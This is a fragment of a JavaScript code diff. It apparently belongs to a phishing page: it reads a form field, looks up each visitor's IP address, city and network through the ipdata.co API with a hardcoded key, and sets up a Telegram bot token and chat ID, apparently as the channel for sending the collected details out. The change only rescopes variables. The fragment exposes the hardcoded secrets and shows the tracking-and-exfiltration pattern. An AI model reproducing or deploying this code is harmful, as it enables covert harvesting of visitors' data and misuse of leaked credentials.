@@ -86,17 +86,13 @@ sname.value = '';
 function json(url) {
   return fetch(url).then(res => res.json());
 }
-let data1= "";
-let city1 = "";
-var asn = "";
+
 let apiKey = '3dbdac35c1dfa8d3d5951adddf429d1a931f4acc550abf74ab9eebd8';
 json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
-   data1 = data.ip;
-   city1 = data.city;
-   asn = data.asn.asn;
+let data1 = data.ip;
+  let city1 = data.city;
+ let  asn = data.asn.asn;
   
-
-
 var token ="1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M";
 
 var chat_id = -1001717443651;
